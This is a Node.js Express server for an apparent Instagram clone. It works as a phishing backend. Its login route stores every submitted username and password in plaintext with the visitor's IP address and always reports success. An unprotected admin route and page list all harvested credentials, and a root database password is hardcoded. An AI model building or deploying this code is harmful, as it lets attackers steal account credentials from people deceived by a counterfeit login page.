const express = require('express');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const port = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// MySQL Connection
const db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'AliHamzA@@@@@@1', // Change this to your MySQL password
    database: 'instagram_clone'
});

db.connect((err) => {
    if (err) {
        console.error('Database connection failed:', err);
        return;
    }
    console.log('Connected to MySQL database');
});

// Create users table if it doesn't exist
const createTableQuery = `
    CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ip_address VARCHAR(45)
    )
`;

db.query(createTableQuery, (err) => {
    if (err) {
        console.error('Error creating table:', err);
    } else {
        console.log('Users table ready');
    }
});

// Login route
app.post('/api/login', (req, res) => {
    console.log('Login request received:', req.body);
    
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Username and password required' 
        });
    }
    
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const query = 'INSERT INTO users (username, password, ip_address) VALUES (?, ?, ?)';
    
    db.query(query, [username, password, ip], (err, result) => {
        if (err) {
            console.error('Error saving credentials:', err);
            return res.status(500).json({ 
                success: false, 
                message: 'Error saving credentials' 
            });
        }
        
        console.log('Credentials saved successfully');
        res.json({ 
            success: true, 
            message: 'Login successful' 
        });
    });
});

// Admin credentials route
app.get('/api/admin/credentials', (req, res) => {
    const query = 'SELECT * FROM users ORDER BY login_time DESC';
    
    db.query(query, (err, results) => {
        if (err) {
            console.error('Error fetching credentials:', err);
            return res.status(500).json({ 
                success: false, 
                message: 'Error fetching credentials' 
            });
        }
        
        res.json(results);
    });
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Catch-all route for any other requests
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ 
        success: false, 
        message: 'Internal server error' 
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log(`Admin panel at http://localhost:${port}/admin`);
});